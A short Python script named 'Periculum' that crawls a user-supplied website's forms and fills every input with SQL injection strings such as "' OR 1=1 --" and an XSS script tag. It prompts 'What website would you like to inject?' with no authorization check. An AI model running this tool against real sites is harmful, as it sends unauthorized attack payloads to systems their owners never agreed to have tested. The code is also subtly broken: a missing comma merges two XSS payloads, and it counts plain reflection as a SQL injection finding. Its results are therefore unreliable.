import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

print("""
   ▄███████▄    ▄████████    ▄████████  ▄█   ▄████████ ███    █▄   ▄█       ███    █▄    ▄▄▄▄███▄▄▄▄   
  ███    ███   ███    ███   ███    ███ ███  ███    ███ ███    ███ ███       ███    ███ ▄██▀▀▀███▀▀▀██▄ 
  ███    ███   ███    █▀    ███    ███ ███▌ ███    █▀  ███    ███ ███       ███    ███ ███   ███   ███ 
  ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███▌ ███        ███    ███ ███       ███    ███ ███   ███   ███ 
▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███▌ ███        ███    ███ ███       ███    ███ ███   ███   ███ 
  ███          ███    █▄  ▀███████████ ███  ███    █▄  ███    ███ ███       ███    ███ ███   ███   ███ 
  ███          ███    ███   ███    ███ ███  ███    ███ ███    ███ ███▌    ▄ ███    ███ ███   ███   ███ 
 ▄████▀        ██████████   ███    ███ █▀   ████████▀  ████████▀  █████▄▄██ ████████▀   ▀█   ███   █▀  
                            ███    ███                            ▀                                    
""")

print("""Welcome to Periculum!
""")

# attack payloads

SQL_INJECT_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "'or '1'='1",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>"
    "'';!--\"<XSS>=&{()}",
]

# find forms on a website

def find_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException as e:
        print(f"Error fetching the URL: {e}")
        return []

# submit form with a payload

def submit_form(form, url, payload):
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = form.find_all('input')

    data = {}
    for input in inputs:
        name = input.attrs.get('name')
        if name:
            data[name] = payload

    try:
        if method == 'post':
            return requests.post(urljoin(url, action), data=data)
        else:
            return requests.get(urljoin(url, action), params=data)
    except requests.RequestException as e:
        print(f"Error submitting the form: {e}")
        return None

# test forms with payloads

def test_forms(url):
    forms = find_forms(url)
    if not forms:
        print("No forms found on the page.")
        return

    form_tested = False
    for form in forms:
        for payload in SQL_INJECT_PAYLOADS + XSS_PAYLOADS:
            response = submit_form(form, url, payload)
            if response and payload in response.text:
                print(f'Vulnerability found with payload: {payload}')
                form_tested = True

    if not form_tested:
        print("No vulnerabilities found or no form submissions succeeded.")

# main script
if __name__ == '__main__':
    target_url = input("What website would you like to inject? ")
    if target_url.startswith('http'):
        test_forms(target_url)
    else:
        print("Invalid URL. Please enter a valid URL starting with http or https.")